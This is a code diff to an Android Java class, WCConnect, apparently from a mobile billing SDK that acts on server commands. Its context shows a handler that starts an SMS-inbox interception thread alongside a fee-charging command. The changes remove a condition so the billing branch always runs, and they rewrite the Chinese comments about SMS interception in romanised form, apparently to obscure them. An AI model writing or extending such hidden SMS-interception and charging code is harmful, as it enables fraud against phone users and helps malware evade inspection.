@@ -693,8 +693,10 @@ public class WCConnect {
 					if (revBean.getCmdid() == Config.CMD_NOCONFIG) {
 						NoConfigMsg = revBean.getMsg();
 					}
-				}
-				Log.e("test", "WCConnect(697)--NoConfigMsg000:"+NoConfigMsg);
+				}				
+				CheckLog.log(this.getClass().getName(), new Exception()
+						.getStackTrace().toString(), "NoConfigMsg000(697):"
+						+ NoConfigMsg);
 				// 判断是否noconfig,如果是,则显示,并且终止计费流程
 				if (NoConfigMsg.length() > 0) {
 //					Message msg = Message.obtain();
@@ -702,9 +704,11 @@ public class WCConnect {
 //					msg.obj = NoConfigMsg;
 //					handler.sendMessage(msg);
 //					showToast(NoConfigMsg);
-					Log.e("test", "WCConnect(705)--NoConfigMsg111:"+NoConfigMsg);
+					CheckLog.log(this.getClass().getName(), new Exception()
+							.getStackTrace().toString(), "NoConfigMsg111(707):"
+							+ NoConfigMsg);
 					String objStr = "";
-					if ("没有通道".equals(NoConfigMsg)) {
+					/*if ("没有通道".equals(NoConfigMsg))*/ {
 						JSONObject jObject = new JSONObject(OtherInfo);
 						String userOrder = 	jObject.getString("user_orderid");																		
 						JSONObject jsonObject = new JSONObject();
@@ -714,9 +718,9 @@ public class WCConnect {
 						jsonObject.put("orderid", userOrder);
 						jsonObject.put("skyPayPoint", skyPayPoint); //skyPayPoint
 						objStr = jsonObject.toString();
-					} else {
+					} /*else {
 						objStr = NoConfigMsg;
-					}
+					}*/
 										
 					Message msg = Message.obtain();
 					msg.what = 1078;
@@ -1081,7 +1085,7 @@ public class WCConnect {
 							+ "\t\tCMDMsg:新规则下发json有误");
 				}
 			} else if (revBean.getCmdid() == Config.CMD_OPENHOLDSMS) {
-				// region 开启短信拦截
+				// region 开启sms lanjie
 				PostLog("SMSLog:SDK开始建立拦截!");
 				//mlog.i("SMSLog:SDK开始建立拦截!aJSONData = " + aJSONData.toString());
 
@@ -1136,7 +1140,7 @@ public class WCConnect {
 					}
 					SendHanlderMsg(Config.getInstance().tpHandler,
 							Config.CMD_STARTFEE, "");
-					// 启动短信收件箱拦截线程
+					// 启动sms收件箱lanjie线程
 					MySTask.getInstance(context).CheckNewSms();
 				}
 				// endregion
